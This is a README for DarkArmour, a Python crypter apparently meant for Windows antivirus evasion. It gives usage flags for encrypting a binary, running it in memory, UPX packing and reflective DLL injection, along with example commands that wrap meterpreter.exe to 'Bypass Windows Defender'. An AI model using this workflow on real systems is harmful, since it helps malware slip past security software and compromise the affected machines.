# Windows AV Evasion Tool

Store and execute an encrypted windows binary from inside memory, without a single bit touching disk.

## Usage

```
DarkArmour (v0.1) by Dylan Halls

usage: darkarmour.py [-h] [-u] [-b] [-d] [-s] [-r] [-k KEY] [-o OUTFILE] file

positional arguments:
  file                  file to crypt, assumed as binary if not told otherwise

optional arguments:
  -h, --help            show this help message and exit
  -u, --upx             upx file before crypting
  -b, --binary          provide if file is a binary exe
  -d, --dll             use reflective dll injection to execute the binary
                        inside another process
  -s, --source          provide if the file is c source code
  -r, --raw             store binary in memory without encrypting
  -k KEY, --key KEY     key to encrypt with, randomly generated if not
                        supplied
  -o OUTFILE, --outfile OUTFILE
                        name of outfile, if not provided then random filename
                        is assigned
```

## Example

`	./crypter.py meterpreter.exe -o meta.exe`

## Bypass Windows Defender

- windows pe binary

`	./crypter.py -u meterpreter.exe -o meta.exe`

## TODO

  - Intergrate into PowerUp
  - Add support for flags s,r,k
  - Run shellcode option, use dll inject to do it in diffrent process
  - Load pe image over a socket so not stored inside the binary
